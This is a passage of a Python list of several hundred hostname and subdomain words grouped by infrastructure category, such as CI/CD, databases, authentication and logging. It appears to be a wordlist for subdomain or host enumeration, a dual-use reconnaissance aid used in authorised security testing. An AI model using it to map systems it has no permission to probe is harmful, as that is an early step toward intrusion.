        "tempo", "tempo-dev", "tempo-staging", "tempo-prod", "tempo-test",
        "jaeger", "jaeger-dev", "jaeger-staging", "jaeger-prod", "jaeger-test",
        "zipkin", "zipkin-dev", "zipkin-staging", "zipkin-prod", "zipkin-test",
        "skywalking", "skywalking-dev", "skywalking-staging", "skywalking-prod", "skywalking-test",
        
        # ==================== 501-600: CI/CD & VERSION CONTROL ====================
        "jenkins", "jenkins-dev", "jenkins-staging", "jenkins-prod", "jenkins-test",
        "jenkins-ci", "jenkins-cd", "jenkins-master", "jenkins-agent", "jenkins-slave",
        "jenkins-blueocean", "jenkins-pipeline", "jenkins-jobs", "jenkins-view", "jenkins-node",
        "gitlab", "gitlab-dev", "gitlab-staging", "gitlab-prod", "gitlab-test",
        "gitlab-ci", "gitlab-runner", "gitlab-registry", "gitlab-pages", "gitlab-master",
        "github", "github-dev", "github-staging", "github-prod", "github-test",
        "github-actions", "github-runners", "github-pages", "github-packages", "github-codespaces",
        "bitbucket", "bitbucket-dev", "bitbucket-staging", "bitbucket-prod", "bitbucket-test",
        "bitbucket-pipelines", "bitbucket-runner", "bitbucket-pages", "bitbucket-static", "bitbucket-cache",
        "git", "git-dev", "git-staging", "git-prod", "git-test",
        "gitea", "gitea-dev", "gitea-staging", "gitea-prod", "gitea-test",
        "gogs", "gogs-dev", "gogs-staging", "gogs-prod", "gogs-test",
        "azure-devops", "azure-devops-dev", "azure-devops-staging", "azure-devops-prod", "azure-devops-test",
        "azure-pipelines", "azure-repos", "azure-artifacts", "azure-testplans", "azure-boards",
        "circleci", "circleci-dev", "circleci-staging", "circleci-prod", "circleci-test",
        "travisci", "travisci-dev", "travisci-staging", "travisci-prod", "travisci-test",
        "gitlab-ci-master", "gitlab-ci-runner01", "gitlab-ci-runner02", "gitlab-ci-cache", "gitlab-ci-artifacts",
        "jenkins-master01", "jenkins-master02", "jenkins-agent01", "jenkins-agent02", "jenkins-backup",
        "sonarqube", "sonarqube-dev", "sonarqube-staging", "sonarqube-prod", "sonarqube-test",
        "sonarcloud", "sonarcloud-dev", "sonarcloud-staging", "sonarcloud-prod", "sonarcloud-test",
        "nexus", "nexus-dev", "nexus-staging", "nexus-prod", "nexus-test",
        "nexus-repository", "nexus-artifacts", "nexus-docker", "nexus-maven", "nexus-npm",
        "artifactory", "artifactory-dev", "artifactory-staging", "artifactory-prod", "artifactory-test",
        "artifactory-repo", "artifactory-docker", "artifactory-maven", "artifactory-npm", "artifactory-pypi",
        "jfrog", "jfrog-dev", "jfrog-staging", "jfrog-prod", "jfrog-test",
        "jfrog-artifactory", "jfrog-xray", "jfrog-pipelines", "jfrog-distribution", "jfrog-mission-control",
        "harbor", "harbor-dev", "harbor-staging", "harbor-prod", "harbor-test",
        "harbor-registry", "harbor-chartmuseum", "harbor-notary", "harbor-clair", "harbor-trivy",
        "quay", "quay-dev", "quay-staging", "quay-prod", "quay-test",
        "quay-registry", "quay-repository", "quay-enterprise", "quay-security", "quay-scanning",
        
        # ==================== 601-700: DATABASES & DATA STORES ====================
        "mysql", "mysql-dev", "mysql-staging", "mysql-prod", "mysql-test",
        "mysql01", "mysql02", "mysql03", "mysql04", "mysql05",
        "mysql-master", "mysql-slave", "mysql-replica", "mysql-backup", "mysql-restore",
        "postgres", "postgresql", "postgres-dev", "postgres-staging", "postgres-prod",
        "postgres01", "postgres02", "postgres03", "postgres04", "postgres05",
        "postgres-master", "postgres-slave", "postgres-replica", "postgres-backup", "postgres-wal",
        "mongo", "mongodb", "mongo-dev", "mongo-staging", "mongo-prod",
        "mongo01", "mongo02", "mongo03", "mongo04", "mongo05",
        "mongo-primary", "mongo-secondary", "mongo-arbiter", "mongo-backup", "mongo-ops",
        "redis", "redis-dev", "redis-staging", "redis-prod", "redis-test",
        "redis01", "redis02", "redis03", "redis04", "redis05",
        "redis-master", "redis-slave", "redis-replica", "redis-sentinel", "redis-backup",
        "memcached", "memcached-dev", "memcached-staging", "memcached-prod", "memcached-test",
        "memcached01", "memcached02", "memcached03", "memcached04", "memcached05",
        "elasticsearch-data01", "elasticsearch-data02", "elasticsearch-data03", "elasticsearch-data04", "elasticsearch-data05",
        "elasticsearch-master01", "elasticsearch-master02", "elasticsearch-master03", "elasticsearch-hot", "elasticsearch-warm",
        "cassandra", "cassandra-dev", "cassandra-staging", "cassandra-prod", "cassandra-test",
        "cassandra01", "cassandra02", "cassandra03", "cassandra04", "cassandra05",
        "cassandra-seed", "cassandra-node", "cassandra-backup", "cassandra-commitlog", "cassandra-hints",
        "couchbase", "couchbase-dev", "couchbase-staging", "couchbase-prod", "couchbase-test",
        "couchbase01", "couchbase02", "couchbase03", "couchbase04", "couchbase05",
        "couchdb", "couchdb-dev", "couchdb-staging", "couchdb-prod", "couchdb-test",
        "neo4j", "neo4j-dev", "neo4j-staging", "neo4j-prod", "neo4j-test",
        "neo4j-bolt", "neo4j-http", "neo4j-browser", "neo4j-backup", "neo4j-import",
        "influxdb", "influxdb-dev", "influxdb-staging", "influxdb-prod", "influxdb-test",
        "influxdb01", "influxdb02", "influxdb03", "influxdb-meta", "influxdb-data",
        "timescaledb", "timescaledb-dev", "timescaledb-staging", "timescaledb-prod", "timescaledb-test",
        "clickhouse", "clickhouse-dev", "clickhouse-staging", "clickhouse-prod", "clickhouse-test",
        "clickhouse01", "clickhouse02", "clickhouse03", "clickhouse-shard", "clickhouse-replica",
        
        # ==================== 701-800: MESSAGE QUEUES & STREAMING ====================
        "kafka", "kafka-dev", "kafka-staging", "kafka-prod", "kafka-test",
        "kafka01", "kafka02", "kafka03", "kafka04", "kafka05",
        "kafka-broker01", "kafka-broker02", "kafka-broker03", "kafka-zookeeper", "kafka-schema-registry",
        "zookeeper", "zookeeper-dev", "zookeeper-staging", "zookeeper-prod", "zookeeper-test",
        "zookeeper01", "zookeeper02", "zookeeper03", "zookeeper04", "zookeeper05",
        "rabbitmq", "rabbitmq-dev", "rabbitmq-staging", "rabbitmq-prod", "rabbitmq-test",
        "rabbitmq01", "rabbitmq02", "rabbitmq03", "rabbitmq04", "rabbitmq05",
        "rabbitmq-master", "rabbitmq-node", "rabbitmq-management", "rabbitmq-queue", "rabbitmq-exchange",
        "activemq", "activemq-dev", "activemq-staging", "activemq-prod", "activemq-test",
        "activemq01", "activemq02", "activemq03", "activemq-artemis", "activemq-management",
        "nsq", "nsq-dev", "nsq-staging", "nsq-prod", "nsq-test",
        "nsq01", "nsq02", "nsq03", "nsq-lookupd", "nsq-admin",
        "nats", "nats-dev", "nats-staging", "nats-prod", "nats-test",
        "nats01", "nats02", "nats03", "nats-streaming", "nats-monitor",
        "pulsar", "pulsar-dev", "pulsar-staging", "pulsar-prod", "pulsar-test",
        "pulsar01", "pulsar02", "pulsar03", "pulsar-broker", "pulsar-bookkeeper",
        "redis-streams", "redis-streams-dev", "redis-streams-staging", "redis-streams-prod", "redis-streams-test",
        "aws-sqs", "aws-sqs-dev", "aws-sqs-staging", "aws-sqs-prod", "aws-sqs-test",
        "aws-sqs-queue", "aws-sqs-fifo", "aws-sqs-dlq", "aws-sqs-standard", "aws-sqs-visibility",
        "azure-servicebus", "azure-sb-dev", "azure-sb-staging", "azure-sb-prod", "azure-sb-test",
        "azure-sb-queue", "azure-sb-topic", "azure-sb-subscription", "azure-sb-relay", "azure-sb-event",
        "gcp-pubsub", "gcp-pubsub-dev", "gcp-pubsub-staging", "gcp-pubsub-prod", "gcp-pubsub-test",
        "gcp-pubsub-topic", "gcp-pubsub-subscription", "gcp-pubsub-schema", "gcp-pubsub-snapshot", "gcp-pubsub-seek",
        "kinesis", "kinesis-dev", "kinesis-staging", "kinesis-prod", "kinesis-test",
        "kinesis-stream", "kinesis-data", "kinesis-analytics", "kinesis-firehose", "kinesis-client",
        "eventhub", "eventhub-dev", "eventhub-staging", "eventhub-prod", "eventhub-test",
        "eventhub-namespace", "eventhub-entity", "eventhub-capture", "eventhub-inspect", "eventhub-processor",
        
        # ==================== 801-900: ORCHESTRATION & CONTAINERS ====================
        "kubernetes", "k8s", "k8s-dev", "k8s-staging", "k8s-prod",
        "k8s-api", "k8s-dashboard", "k8s-ingress", "k8s-master", "k8s-node",
        "kube-apiserver", "kube-scheduler", "kube-controller", "kube-proxy", "kube-dns",
        "kube-system", "kube-public", "kube-node-lease", "kube-flannel", "kube-calico",
        "kube-prometheus", "kube-state-metrics", "kube-events", "kube-logs", "kube-monitoring",
        "docker", "docker-dev", "docker-staging", "docker-prod", "docker-test",
        "docker-registry", "docker-hub", "docker-cache", "docker-build", "docker-push",
        "docker-swarm", "docker-swarm-manager", "docker-swarm-worker", "docker-swarm-node", "docker-swarm-service",
        "container-registry", "container-registry-dev", "container-registry-staging", "container-registry-prod", "container-registry-test",
        "registry", "registry-dev", "registry-staging", "registry-prod", "registry-test",
        "registry-hub", "registry-cache", "registry-auth", "registry-storage", "registry-web",
        "k3s", "k3s-dev", "k3s-staging", "k3s-prod", "k3s-test",
        "k3s-master", "k3s-agent", "k3s-server", "k3s-node", "k3s-cluster",
        "rancher", "rancher-dev", "rancher-staging", "rancher-prod", "rancher-test",
        "rancher-server", "rancher-agent", "rancher-cluster", "rancher-project", "rancher-namespace",
        "openshift", "openshift-dev", "openshift-staging", "openshift-prod", "openshift-test",
        "openshift-api", "openshift-console", "openshift-registry", "openshift-router", "openshift-monitoring",
        "nomad", "nomad-dev", "nomad-staging", "nomad-prod", "nomad-test",
        "nomad-server", "nomad-client", "nomad-job", "nomad-allocation", "nomad-evaluation",
        "consul", "consul-dev", "consul-staging", "consul-prod", "consul-test",
        "consul-server", "consul-client", "consul-dns", "consul-ui", "consul-kv",
        "etcd", "etcd-dev", "etcd-staging", "etcd-prod", "etcd-test",
        "etcd01", "etcd02", "etcd03", "etcd-metrics", "etcd-backup",
        "istio", "istio-dev", "istio-staging", "istio-prod", "istio-test",
        "istio-ingress", "istio-egress", "istio-pilot", "istio-mixer", "istio-galley",
        "linkerd", "linkerd-dev", "linkerd-staging", "linkerd-prod", "linkerd-test",
        "linkerd-proxy", "linkerd-controller", "linkerd-destination", "linkerd-identity", "linkerd-tap",
        "envoy", "envoy-dev", "envoy-staging", "envoy-prod", "envoy-test",
        "envoy-proxy", "envoy-ingress", "envoy-egress", "envoy-sidecar", "envoy-gateway",
        
        # ==================== 901-1000: STORAGE & BACKUP ====================
        "storage", "storage-dev", "storage-staging", "storage-prod", "storage-test",
        "storage01", "storage02", "storage03", "storage04", "storage05",
        "storage-nfs", "storage-ceph", "storage-gluster", "storage-iscsi", "storage-fibre",
        "ceph", "ceph-dev", "ceph-staging", "ceph-prod", "ceph-test",
        "ceph-mon", "ceph-osd", "ceph-mds", "ceph-rgw", "ceph-dashboard",
        "minio", "minio-dev", "minio-staging", "minio-prod", "minio-test",
        "minio-server", "minio-client", "minio-console", "minio-gateway", "minio-bucket",
        "s3", "s3-dev", "s3-staging", "s3-prod", "s3-test",
        "s3-bucket", "s3-backup", "s3-archive", "s3-logs", "s2-database",
        "s3fs", "s3-fuse", "s3-sync", "s3-backup-dev", "s3-backup-prod",
        "glusterfs", "glusterfs-dev", "glusterfs-staging", "glusterfs-prod", "glusterfs-test",
        "glusterfs-brick", "glusterfs-server", "glusterfs-client", "glusterfs-vol", "glusterfs-heal",
        "nfs", "nfs-dev", "nfs-staging", "nfs-prod", "nfs-test",
        "nfs-server", "nfs-client", "nfs-export", "nfs-mount", "nfs-storage",
        "backup", "backup-dev", "backup-staging", "backup-prod", "backup-test",
        "backup-server", "backup-client", "backup-storage", "backup-archive", "backup-restore",
        "backup01", "backup02", "backup03", "backup04", "backup05",
        "backup-daily", "backup-weekly", "backup-monthly", "backup-hourly", "backup-realtime",
        "velero", "velero-dev", "velero-staging", "velero-prod", "velero-test",
        "velero-backup", "velero-restore", "velero-schedule", "velero-logs", "velero-metrics",
        "restic", "restic-dev", "restic-staging", "restic-prod", "restic-test",
        "restic-repo", "restic-backup", "restic-snapshot", "restic-restore", "restic-check",
        "borg", "borg-dev", "borg-staging", "borg-prod", "borg-test",
        "borg-backup", "borg-repo", "borg-server", "borg-client", "borg-mount",
        "duplicati", "duplicati-dev", "duplicati-staging", "duplicati-prod", "duplicati-test",
        "duplicati-server", "duplicati-backup", "duplicati-restore", "duplicati-schedule", "duplicati-logs",
        "rsync", "rsync-dev", "rsync-staging", "rsync-prod", "rsync-test",
        "rsync-server", "rsync-client", "rsync-backup", "rsync-sync", "rsync-daemon",
        "bak", "bak01", "bak02", "bak03", "bak04", "bak05",
        "bak-dev", "bak-staging", "bak-prod", "bak-test",
        "archive", "archive-dev", "archive-staging", "archive-prod", "archive-test",
        "archive01", "archive02", "archive03", "archive04", "archive05",
        "archive-log", "archive-data", "archive-old", "archive-cold", "archive-deep",
        
        # ==================== 1001-1100: NETWORK & LOAD BALANCING ====================
        "lb", "lb01", "lb02", "lb03", "lb04", "lb05", "lb06", "lb07", "lb08", "lb09", "lb10",
        "loadbalancer", "loadbalancer01", "loadbalancer02", "loadbalancer03", "loadbalancer04", "loadbalancer05",
        "loadbalancer-prod", "loadbalancer-staging", "loadbalancer-dev", "loadbalancer-test", "loadbalancer-internal",
        "haproxy", "haproxy01", "haproxy02", "haproxy03", "haproxy04", "haproxy05",
        "haproxy-dev", "haproxy-staging", "haproxy-prod", "haproxy-test", "haproxy-internal",
        "nginx-lb", "nginx-lb01", "nginx-lb02", "nginx-lb03", "nginx-lb04", "nginx-lb05",
        "nginx-lb-dev", "nginx-lb-staging", "nginx-lb-prod", "nginx-lb-test", "nginx-lb-internal",
        "traefik", "traefik01", "traefik02", "traefik03", "traefik04", "traefik05",
        "traefik-dev", "traefik-staging", "traefik-prod", "traefik-test", "traefik-internal",
        "envoy-proxy", "envoy-proxy01", "envoy-proxy02", "envoy-proxy03", "envoy-lb", "envoy-gateway",
        "f5", "f5-lb", "f5-dev", "f5-staging", "f5-prod", "f5-test",
        "f5-bigip", "f5-loadbalancer", "f5-gtm", "f5-ltm", "f5-as3",
        "cloudflare-lb", "cloudflare-loadbalancer", "cloudflare-lb-dev", "cloudflare-lb-prod", "cloudflare-lb-test",
        "aws-lb", "aws-alb", "aws-nlb", "aws-elb", "aws-lb-dev", "aws-lb-prod",
        "azure-lb", "azure-loadbalancer", "azure-alb", "azure-internal-lb", "azure-public-lb",
        "gcp-lb", "gcp-loadbalancer", "gcp-http-lb", "gcp-tcp-lb", "gcp-ssl-lb",
        "cdnetworks-lb", "cdnetworks-loadbalancer", "akamai-lb", "akamai-loadbalancer", "fastly-lb",
        "router", "router01", "router02", "router03", "router04", "router05",
        "edge-router", "core-router", "border-router", "gateway-router", "aggregation-router",
        "switch", "switch01", "switch02", "switch03", "switch04", "switch05",
        "core-switch", "distribution-switch", "access-switch", "tor-switch", "spine-switch",
        "firewall", "fw01", "fw02", "fw03", "fw04", "fw05",
        "firewall-dev", "firewall-staging", "firewall-prod", "firewall-test", "firewall-internal",
        "paloalto", "paloalto-fw", "paloalto01", "paloalto02", "paloalto-panorama", "paloalto-log",
        "fortinet", "fortinet-fw", "fortigate", "fortigate01", "fortigate02", "fortianalyzer",
        "cisco-asa", "cisco-fw", "cisco-asa01", "cisco-asa02", "cisco-fmc", "cisco-firesight",
        "ids", "ips", "snort", "suricata", "bro", "zeek",
        "ids01", "ips01", "snort-sensor", "suricata-sensor", "zeek-sensor",
        "waf", "waf01", "waf-dev", "waf-staging", "waf-prod", "waf-test",
        "modsecurity", "modsec", "cloudflare-waf", "aws-waf", "azure-waf",
        
        # ==================== 1101-1200: DNS & EMAIL SERVICES ====================
        "dns", "dns01", "dns02", "dns03", "dns04", "dns05",
        "ns1", "ns2", "ns3", "ns4", "ns5",
        "ns1-dev", "ns2-dev", "ns1-prod", "ns2-prod", "ns1-staging",
        "dns-master", "dns-slave", "dns-primary", "dns-secondary", "dns-cache",
        "bind", "bind9", "named", "named01", "named02",
        "powerdns", "pdns", "pdns01", "pdns02", "pdns-recursor",
        "coredns", "coredns01", "coredns02", "coredns03", "coredns-cache",
        "route53", "aws-route53", "azure-dns", "gcp-dns", "cloudflare-dns",
        "dnscrypt", "dnscrypt-proxy", "doh", "doh-server", "doh-proxy",
        "mail", "mail01", "mail02", "mail03", "mail04", "mail05",
        "mail-dev", "mail-staging", "mail-prod", "mail-test", "mail-internal",
        "smtp", "smtp01", "smtp02", "smtp03", "smtp04", "smtp05",
        "smtp-dev", "smtp-prod", "smtp-relay", "smtp-gateway", "smtp-outbound",
        "imap", "imap01", "imap02", "imap03", "imap04", "imap05",
        "imap-dev", "imap-prod", "imap-ssl", "imap-secure", "imap-relay",
        "pop3", "pop301", "pop302", "pop303", "pop3-dev", "pop3-prod",
        "exchange", "exchange01", "exchange02", "exchange03", "exchange-owa", "exchange-ecp",
        "outlook", "outlook-web", "outlook-dev", "outlook-prod", "outlook-anywhere",
        "webmail", "webmail01", "webmail02", "webmail03", "webmail-dev", "webmail-prod",
        "roundcube", "roundcube-webmail", "roundcube-dev", "roundcube-prod", "roundcube-admin",
        "rainloop", "rainloop-webmail", "rainloop-dev", "rainloop-prod", "rainloop-admin",
        "sogo", "sogo-webmail", "sogo-dev", "sogo-prod", "sogo-active-sync",
        "mailman", "mailman-lists", "mailman-dev", "mailman-prod", "mailman-admin",
        "postfix", "postfix01", "postfix02", "postfix-relay", "postfix-mta", "postfix-dev",
        "dovecot", "dovecot01", "dovecot02", "dovecot-imap", "dovecot-pop3", "dovecot-lda",
        "sendmail", "sendmail-mta", "sendmail-relay", "sendmail-dev", "sendmail-prod",
        "exim", "exim01", "exim02", "exim-mta", "exim-relay", "exim-dev",
        "spamassassin", "spamassassin-dev", "spamassassin-prod", "spamassassin-update", "spamassassin-filter",
        "clamav", "clamav-dev", "clamav-prod", "clamav-update", "clamav-scan",
        "dkim", "dkim-signer", "dkim-verifier", "dkim-dev", "dkim-prod",
        "spf", "spf-check", "spf-dev", "spf-prod", "spf-dns",
        "dmarc", "dmarc-check", "dmarc-dev", "dmarc-prod", "dmarc-report",
        
        # ==================== 1201-1300: SECURITY & AUTHENTICATION ====================
        "auth", "auth01", "auth02", "auth03", "auth04", "auth05",
        "auth-dev", "auth-staging", "auth-prod", "auth-test", "auth-internal",
        "sso", "sso01", "sso02", "sso03", "sso-dev", "sso-prod",
        "sso-staging", "sso-test", "sso-internal", "sso-external", "sso-login",
        "oauth", "oauth01", "oauth02", "oauth-dev", "oauth-prod", "oauth-staging",
        "oauth2", "oauth2-server", "oauth2-auth", "oauth2-token", "oauth2-validate",
        "saml", "saml-auth", "saml-sso", "saml-idp", "saml-sp", "saml-metadata",
        "ldap", "ldap01", "ldap02", "ldap03", "ldap-dev", "ldap-prod",
        "ldap-auth", "ldap-login", "ldap-bind", "ldap-search", "ldap-sync",
        "openldap", "openldap01", "openldap02", "openldap-master", "openldap-slave", "openldap-proxy",
        "active-directory", "ad", "ad01", "ad02", "ad03", "ad-dc",
        "ad-dev", "ad-prod", "ad-staging", "ad-test", "ad-auth",
        "keycloak", "keycloak01", "keycloak02", "keycloak-dev", "keycloak-prod", "keycloak-auth",
        "keycloak-sso", "keycloak-admin", "keycloak-realm", "keycloak-client", "keycloak-identity",
        "okta", "okta-dev", "okta-prod", "okta-staging", "okta-test", "okta-sso",
        "auth0", "auth0-dev", "auth0-prod", "auth0-staging", "auth0-test", "auth0-login",
        "fusionauth", "fusionauth-dev", "fusionauth-prod", "fusionauth-staging", "fusionauth-login", "fusionauth-admin",
        "hydra", "hydra-oauth", "hydra-dev", "hydra-prod", "hydra-login", "hydra-consent",
        "dex", "dex-auth", "dex-dev", "dex-prod", "dex-oidc", "dex-github",
        "pomerium", "pomerium-dev", "pomerium-prod", "pomerium-proxy", "pomerium-auth", "pomerium-identity",
        "vault", "vault01", "vault02", "vault03", "vault-dev", "vault-prod",
        "vault-secrets", "vault-raft", "vault-consul", "vault-ui", "vault-operator",
        "cert-manager", "cert-manager-dev", "cert-manager-prod", "cert-manager-webhook", "cert-manager-issuer",
        "letsencrypt", "letsencrypt-dev", "letsencrypt-prod", "letsencrypt-staging", "letsencrypt-certs",
        "tls", "tls-cert", "tls-secret", "tls-issuer", "tls-ingress",
        "mtls", "mtls-auth", "mtls-gateway", "mtls-proxy", "mtls-service",
        "jwt", "jwt-auth", "jwt-issuer", "jwt-validate", "jwt-sign", "jwt-verify",
        "gatekeeper", "gatekeeper-dev", "gatekeeper-prod", "gatekeeper-validate", "gatekeeper-rules",
        "vpn", "vpn01", "vpn02", "vpn03", "vpn-dev", "vpn-prod",
        "openvpn", "openvpn01", "openvpn02", "openvpn-server", "openvpn-client", "openvpn-web",
        "wireguard", "wireguard01", "wireguard02", "wireguard-server", "wireguard-client", "wireguard-ui",
        
        # ==================== 1301-1400: MONITORING DASHBOARDS ====================
        "dashboard", "dashboard-dev", "dashboard-staging", "dashboard-prod", "dashboard-test",
        "dash", "dash-dev", "dash-prod", "dash-staging", "dash-monitoring",
        "status", "status-dev", "status-prod", "status-page", "status-dashboard",
        "statuspage", "statuspage-dev", "statuspage-prod", "statuspage-staging", "statuspage-incidents",
        "uptime", "uptime-dev", "uptime-prod", "uptime-monitoring", "uptime-status",
        "health", "health-dev", "health-prod", "health-check", "health-status",
        "healthz", "readyz", "livez", "metricsz", "versionz",
        "monitor", "monitor-dev", "monitor-prod", "monitor-staging", "monitor-dashboard",
        "monitoring", "monitoring-dev", "monitoring-prod", "monitoring-staging", "monitoring-dashboard",
        "netdata", "netdata-dev", "netdata-prod", "netdata-staging", "netdata-monitoring",
        "datadog-dashboard", "datadog-dev", "datadog-prod", "datadog-staging", "datadog-monitoring",
        "newrelic-dashboard", "newrelic-dev", "newrelic-prod", "newrelic-staging", "newrelic-apm",
        "splunk-dashboard", "splunk-dev", "splunk-prod", "splunk-staging", "splunk-search",
        "grafana-dashboards", "grafana-dash", "grafana-dev", "grafana-prod", "grafana-staging",
        "kibana-dashboards", "kibana-dash", "kibana-dev", "kibana-prod", "kibana-staging",
        "prometheus-graph", "prometheus-graphana", "prometheus-dev", "prometheus-prod", "prometheus-staging",
        "alertmanager-ui", "alertmanager-dev", "alertmanager-prod", "alertmanager-staging", "alertmanager-silence",
        "thanos", "thanos-dev", "thanos-prod", "thanos-staging", "thanos-query",
        "loki-dashboard", "loki-dev", "loki-prod", "loki-staging", "loki-logs",
        "tempo-dashboard", "tempo-dev", "tempo-prod", "tempo-staging", "tempo-traces",
        "jaeger-ui", "jaeger-dev", "jaeger-prod", "jaeger-staging", "jaeger-tracing",
        "zipkin-ui", "zipkin-dev", "zipkin-prod", "zipkin-staging", "zipkin-tracing",
        "cortex", "cortex-dev", "cortex-prod", "cortex-staging", "cortex-query",
        "mimir", "mimir-dev", "mimir-prod", "mimir-staging", "mimir-ingest",
        "victoria-metrics", "victoria-dev", "victoria-prod", "victoria-staging", "victoria-cluster",
        "influxdb-dashboard", "influxdb-dev", "influxdb-prod", "influxdb-staging", "influxdb-ui",
        "chronograf", "chronograf-dev", "chronograf-prod", "chronograf-staging", "chronograf-dashboard",
        "kapacitor", "kapacitor-dev", "kapacitor-prod", "kapacitor-staging", "kapacitor-alerts",
        "telegraf", "telegraf-dev", "telegraf-prod", "telegraf-staging", "telegraf-metrics",
        "collectd", "collectd-dev", "collectd-prod", "collectd-staging", "collectd-metrics",
        "statsd", "statsd-dev", "statsd-prod", "statsd-staging", "statsd-graphite",
        "graphite", "graphite-dev", "graphite-prod", "graphite-staging", "graphite-dashboard",
        "grafana-dashboards-dev", "grafana-dashboards-prod", "grafana-dashboards-staging", "grafana-dashboards-internal", "grafana-dashboards-external",
        
        # ==================== 1401-1500: API GATEWAYS & PROXY ====================
        "gateway", "gateway01", "gateway02", "gateway03", "gateway04", "gateway05",
        "gateway-dev", "gateway-staging", "gateway-prod", "gateway-test", "gateway-internal",
        "api-gateway", "api-gateway01", "api-gateway02", "api-gateway-dev", "api-gateway-prod",
        "apigee", "apigee-dev", "apigee-prod", "apigee-staging", "apigee-test", "apigee-edge",
        "kong", "kong01", "kong02", "kong03", "kong-dev", "kong-prod",
        "kong-admin", "kong-gateway", "kong-manager", "kong-portal", "kong-cluster",
        "tyk", "tyk01", "tyk02", "tyk-dev", "tyk-prod", "tyk-gateway",
        "tyk-dashboard", "tyk-pump", "tyk-operator", "tyk-analytics", "tyk-mdcb",
        "gravitee", "gravitee-dev", "gravitee-prod", "gravitee-gateway", "gravitee-management", "gravitee-portal",
        "wso2", "wso2-dev", "wso2-prod", "wso2-gateway", "wso2-store", "wso2-publisher",
        "gluu", "gluu-dev", "gluu-prod", "gluu-gateway", "gluu-oxd", "gluu-ce",
        "oauth2-proxy", "oauth2-proxy-dev", "oauth2-proxy-prod", "oauth2-proxy-auth", "oauth2-proxy-forward",
        "oauth-proxy", "oauth-proxy-dev", "oauth-proxy-prod", "oauth-proxy-auth", "oauth-proxy-gateway",
        "auth-proxy", "auth-proxy-dev", "auth-proxy-prod", "auth-proxy-validate", "auth-proxy-forward",
        "traefik-auth", "traefik-auth-proxy", "traefik-forward-auth", "traefik-dev", "traefik-prod",
        "nginx-auth", "nginx-auth-proxy", "nginx-auth-request", "nginx-auth-dev", "nginx-auth-prod",
        "envoy-auth", "envoy-ext-auth", "envoy-authz", "envoy-rbac", "envoy-jwt",
        "istio-auth", "istio-authentication", "istio-authorization", "istio-policy", "istio-telemetry",
        "ambassador", "ambassador-dev", "ambassador-prod", "ambassador-gateway", "ambassador-auth",
        "contour", "contour-dev", "contour-prod", "contour-gateway", "contour-proxy",
        "gloo", "gloo-dev", "gloo-prod", "gloo-gateway", "gloo-proxy",
        "gloo-edge", "gloo-mesh", "gloo-portal", "gloo-observability", "gloo-security",
        "maesh", "maesh-dev", "maesh-prod", "maesh-gateway", "maesh-proxy",
        "fabio", "fabio-dev", "fabio-prod", "fabio-lb", "fabio-gateway",
        "vulcand", "vulcand-dev", "vulcand-prod", "vulcand-proxy", "vulcand-api",
        "routr", "routr-dev", "routr-prod", "routr-proxy", "routr-gateway",
        "solo", "solo-dev", "solo-prod", "solo-gateway", "solo-proxy",
        "caddy", "caddy-dev", "caddy-prod", "caddy-proxy", "caddy-reverse-proxy",
        "pomerium-proxy", "pomerium-gateway", "pomerium-authenticate", "pomerium-authorize", "pomerium-identity",
        
        # ==================== 1501-1600: LOG MANAGEMENT ====================
        "logs", "log", "logging", "log-dev", "log-prod", "log-staging",
        "log01", "log02", "log03", "log04", "log05",
        "log-server", "log-collector", "log-processor", "log-forwarder", "log-aggregator",
        "elk", "elk-dev", "elk-prod", "elk-staging", "elk-stack",
        "elasticsearch-logs", "elasticsearch-log01", "elasticsearch-log02", "elasticsearch-log03", "elasticsearch-log-data",
        "logstash-logs", "logstash-collector", "logstash-forwarder", "logstash-processor", "logstash-ingest",
        "kibana-logs", "kibana-logging", "kibana-discover", "kibana-dash-logs", "kibana-visualize-logs",
        "graylog", "graylog-dev", "graylog-prod", "graylog-staging", "graylog-server",
        "graylog-input", "graylog-stream", "graylog-dashboard", "graylog-alert", "graylog-extractor",
        "splunk-logs", "splunk-log01", "splunk-log02", "splunk-log03", "splunk-heavy-forwarder",
        "splunk-indexer", "splunk-search-head", "splunk-deployment", "splunk-license", "splunk-monitoring",
        "splunk-es", "splunk-ds", "splunk-sh", "splunk-hf", "splunk-uf",
        "sumologic-logs", "sumologic-collector", "sumologic-http", "sumologic-syslog", "sumologic-cloud",
        "logz", "logz-dev", "logz-prod", "logz-staging", "logz-io",
        "papertrail-logs", "papertrail-dev", "papertrail-prod", "papertrail-syslog", "papertrail-aggregator",
        "logdna", "logdna-dev", "logdna-prod", "logdna-agent", "logdna-ingest",
        "fluentd", "fluentd-dev", "fluentd-prod", "fluentd-aggregator", "fluentd-forwarder",
        "fluentbit", "fluentbit-dev", "fluentbit-prod", "fluentbit-collector", "fluentbit-forwarder",
        "vector", "vector-dev", "vector-prod", "vector-agent", "vector-aggregator",
        "logstash-forwarder-logs", "logstash-lumberjack", "logstash-beats", "logstash-redis", "logstash-kafka",
        "audit-logs", "audit-log01", "audit-log02", "audit-log03", "audit-logging",
        "syslog", "syslog01", "syslog02", "syslog03", "syslog-server",
        "rsyslog", "rsyslog-server", "rsyslog-client", "rsyslog-forwarder", "rsyslog-relay",
        "syslog-ng", "syslog-ng-server", "syslog-ng-client", "syslog-ng-forwarder", "syslog-ng-relay",
        "logrotate", "logrotate-dev", "logrotate-prod", "logrotate-server", "logrotate-compress",
        "journal", "journald", "journal-server", "journal-forwarder", "journal-remote",
        "log-archive", "log-archive01", "log-archive02", "log-archive03", "log-archive-s3",
        "log-backup", "log-backup01", "log-backup02", "log-backup-daily", "log-backup-weekly",
        "auditd", "auditd-server", "auditd-collector", "auditd-dispatcher", "auditd-rules",
        "osquery", "osquery-dev", "osquery-prod", "osquery-collector", "osquery-daemon",
        "falco", "falco-dev", "falco-prod", "falco-sensor", "falco-rules",
        
        # ==================== 1601-1700: DEVOPS TOOLS ====================
        "argocd", "argocd-dev", "argocd-staging", "argocd-prod", "argocd-test",
        "argo-cd", "argo-workflows", "argo-events", "argo-rollouts", "argo-server",
        "argo-ui", "argo-api", "argo-repo", "argo-app", "argo-project",
        "argocd-server", "argocd-repo-server", "argocd-dex", "argocd-redis", "argocd-application",
        "flux", "flux-dev", "flux-staging", "flux-prod", "flux-test",
        "fluxcd", "flux-source", "flux-helm", "flux-kustomize", "flux-notification",
        "flux-weave", "flux-gitops", "flux-image", "flux-metrics", "flux-logs",
        "jenkins-x", "jx", "jx-dev", "jx-staging", "jx-prod",
        "jenkins-x-git", "jenkins-x-chart", "jenkins-x-docker", "jenkins-x-build", "jenkins-x-release",
        "drone", "drone-dev", "drone-staging", "drone-prod", "drone-test",
        "drone-server", "drone-runner", "drone-docker", "drone-kubernetes", "drone-github",
